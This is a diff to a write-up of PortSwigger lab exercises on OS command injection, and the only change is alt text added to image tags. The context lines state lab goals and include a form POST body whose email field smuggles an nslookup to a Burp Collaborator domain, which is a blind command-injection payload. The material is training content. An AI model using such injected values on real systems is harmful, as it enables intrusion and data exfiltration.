@@ -42,7 +42,7 @@ Goal : execute the `whoami` command to determine the name of the current user.
 
 
 
-<img src="/assets/img/portswigger/command_injection/1_1.png" style="zoom:80%;" />
+<img src="/assets/img/portswigger/command_injection/1_1.png" alt="os command injection" style="zoom:80%;" />
 
 
 
@@ -136,7 +136,7 @@ Goal :  exploit the blind OS command injection vulnerability to issue a DNS look
   csrf=UfTw8aBwMGPhF6MGrJy2VBawdAB06GQ5&name=karim&email=123%40gmail.com%26nslookup%20y21kg9ifjgutl206yib4mhvtrkxdl2.burpcollaborator.net%20%23&subject=123&message=123
   ```
 
-  <img src="/assets/img/portswigger/command_injection/3_1.png" style="zoom:80%;" />
+  <img src="/assets/img/portswigger/command_injection/3_1.png" alt="os command injection" style="zoom:80%;" />
 
 <br />
 
@@ -144,7 +144,7 @@ Goal :  exploit the blind OS command injection vulnerability to issue a DNS look
 
 - if you go to `Burp collaborator client` and click pull now , you will see the DNS request to our domain
 
-<img src="/assets/img/portswigger/command_injection/3_2.png" style="zoom:80%;" />
+<img src="/assets/img/portswigger/command_injection/3_2.png" alt="os command injection" style="zoom:80%;" />
 
 <br /><br />
 
@@ -185,7 +185,7 @@ Goal : execute the `whoami` command and exfiltrate the output via a DNS query to
 
 
 
-<img src="/assets/img/portswigger/command_injection/4_1.png" style="zoom:80%;" />
+<img src="/assets/img/portswigger/command_injection/4_1.png" alt="os command injection" style="zoom:80%;" />
 
 
 
